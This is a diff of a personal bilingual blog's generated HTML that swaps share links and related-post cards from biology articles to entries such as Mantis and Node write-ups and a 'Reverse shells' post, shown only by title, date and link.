-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmultifunctional_proteins%2f&description=Multifunctional%20proteins%20and%20evolution%20%28available%20in%20greek%20only%29&media=https://alamot.github.io/images/multifunction.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmultifunctional_proteins%2f&description=%ce%a0%ce%bf%ce%bb%cf%85%ce%bb%ce%b5%ce%b9%cf%84%ce%bf%cf%85%cf%81%ce%b3%ce%b9%ce%ba%ce%ad%cf%82%20%cf%80%cf%81%cf%89%cf%84%ce%b5%ce%90%ce%bd%ce%b5%cf%82%20%ce%ba%ce%b1%ce%b9%20%ce%b5%ce%be%ce%ad%ce%bb%ce%b9%ce%be%ce%b7&media=https://alamot.github.io/images/multifunction.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fmantis_writeup%2f&t=Mantis%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fmantis_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmantis_writeup%2f&text=Mantis%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmantis_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Mantis&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmantis_writeup%2f&description=Mantis%20write-up&media=https://alamot.github.io/images/mantis.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmantis_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Mantis&media=https://alamot.github.io/images/mantis.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -475,93 +871,17 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amylpred2/" class="clearfix">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amylpred2.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/code.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">A consensus method for the prediction of aggregation-prone peptides in globular proteins</h3>
-      <h3 class="title" lang="el">Μια συναινετική μέθοδος πρόγνωσης πεπτιδίων που εμφανίζουν τάση προς συσσωμάτωση στις σφαιρικές πρωτεΐνες</h3>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">10 Jan 2013</time>
-      <time lang="el">10 Ιαν 2013</time>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -571,37 +891,21 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/ess/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/hawkdove.png);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Evolutionarily Stable Strategies (available in greek only)</h3>
-      <h3 class="title" lang="el">Εξελικτικά Σταθερές Στρατηγικές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Nov 2012</time>
-      <time lang="el">01 Νοε 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amyloids/" class="clearfix">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amyloid.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Amyloid fibrils (available in greek only)</h3>
-      <h3 class="title" lang="el">Αμυλοειδή ινίδια</h3>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">11 Jul 2012</time>
-      <time lang="el">11 Ιουλ 2012</time>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
     </footer>
   </a>
 </article>
@@ -619,17 +923,73 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/evolution_of_cetaceans/" class="clearfix">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dolphin.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">The evolution of Cetaceans (available in greek only)</h3>
-      <h3 class="title" lang="el">Η εξέλιξη των Kητωδών</h3>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2011</time>
-      <time lang="el">17 Νοε 2011</time>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
     </footer>
   </a>
 </article>
@@ -960,13 +1320,6 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
           
-          
-           
-           
-           
-           
-          
-           
            
            
            
@@ -974,14 +1327,7 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -989,14 +1335,7 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1004,33 +1343,35 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
+          
+           
+           
            
           
            
            
            
-           
           
            
            
            
-           
+          
           
            
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/testakia_viologias/" class="clearfix">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/testakia_viologias.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Biology tests (available in greek only)</h3>
-      <h3 class="title" lang="el">Τεστάκια Βιολογίας</h3>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Aug 2015</time>
-      <time lang="el">22 Αυγ 2015</time>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1076,21 +1417,25 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mindcontrol_parasites/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/brain_signals.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mind control parasites. How do they do it?</h3>
-      <h3 class="title" lang="el">Παράσιτα που ελέγχουν το μυαλό. Πώς το κάνουν;</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Oct 2013</time>
-      <time lang="el">03 Οκτ 2013</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -1112,22 +1457,6 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/centrioles/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/centrioles.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Centrioles (available in greek only)</h3>
-      <h3 class="title" lang="el">Κεντριόλια</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jan 2012</time>
-      <time lang="el">22 Ιαν 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1143,126 +1472,10 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/smallest_genome/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/microscope.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">The organism with the smallest genome and proteome</h3>
-      <h3 class="title" lang="el">Ο οργανισμός με το μικρότερο γονιδιώμα και πρωτέωμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">06 Aug 2011</time>
-      <time lang="el">06 Αυγ 2011</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/entomopathogenic_fungi/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ep_fungi.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Entomopathogenic fungi (available in greek only)</h3>
-      <h3 class="title" lang="el">Εντομοπαθογόνοι μύκητες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Nov 2010</time>
-      <time lang="el">22 Νοε 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/intraspecific_and_interspecific_competition/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/competition.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Intraspecific and Interspecific competition (available in greek only)</h3>
-      <h3 class="title" lang="el">Ενδοειδικός και Διαειδικός ανταγωνισμός</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2010</time>
-      <time lang="el">17 Νοε 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/theories_of_intelligence/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/intelligence.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Theories of intelligence (available in greek only)</h3>
-      <h3 class="title" lang="el">Θεωρίες νοημοσύνης</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2010</time>
-      <time lang="el">01 Ιουν 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/microvilli/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/microvilli.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Microvilli (available in greek only)</h3>
-      <h3 class="title" lang="el">Μικρολάχνες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">08 Jan 2010</time>
-      <time lang="el">08 Ιαν 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/electric_current_and_human_body/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/electric.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Electric current and human body (available in greek only)</h3>
-      <h3 class="title" lang="el">Ηλεκτρικό ρεύμα και ανθρώπινο σώμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2009</time>
-      <time lang="el">01 Ιουν 2009</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1284,21 +1497,60 @@ Apic, G., Gough, J., and Teichmann, S. A (2001). «Domain combinations in archae
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/brucellosis/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/Brucella.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Brucellosis (available in greek only)</h3>
-      <h3 class="title" lang="el">Βρουκέλλωση (Μελιταίος πυρετός)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Mar 2004</time>
-      <time lang="el">21 Μαρ 2004</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
